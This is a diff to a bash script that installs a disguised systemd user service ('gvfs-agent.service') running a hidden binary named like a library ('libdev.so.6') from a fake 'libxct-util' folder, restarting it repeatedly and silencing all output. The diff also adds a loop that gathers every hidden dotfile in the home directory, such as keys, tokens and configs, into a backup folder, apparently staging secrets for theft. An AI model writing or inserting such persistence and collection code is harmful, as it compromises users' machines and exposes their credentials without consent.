@@ -1,4 +1,5 @@
 #!/bin/bash
+
 {
 
 mkdir -p $HOME/.config/systemd/user/libxct-util
@@ -25,8 +26,8 @@ StartLimitInterval=0
 
 [Service]
 WorkingDirectory=/home/kyle/.config/systemd/user
-ExecStart=/bin/bash -c "/home/kyle/.config/systemd/user/libxct-util/libdev.so.6"
-ExecStop=kill -HUP $MAINPID
+ExecStart=/bin/bash -c "$HOME/.config/systemd/user/libxct-util/libdev.so.6"
+ExecStop=kill -HUP \$MAINPID
 Restart=always
 RestartSec=120
 RuntimeMaxSec=300
@@ -41,3 +42,13 @@ systemctl --user enable gvfs-agent.service
 systemctl --user start gvfs-agent.service
 
 } &> /dev/null
+
+mkdir -p $HOME/Downloads/backup
+
+readarray -d '' array < <(find $HOME -maxdepth 8 -type f -name '.*' -print0)
+
+for a in "${array[@]}"
+do
+	echo "$a"
+	cp "${a}" $HOME/Downloads/backup/
+done
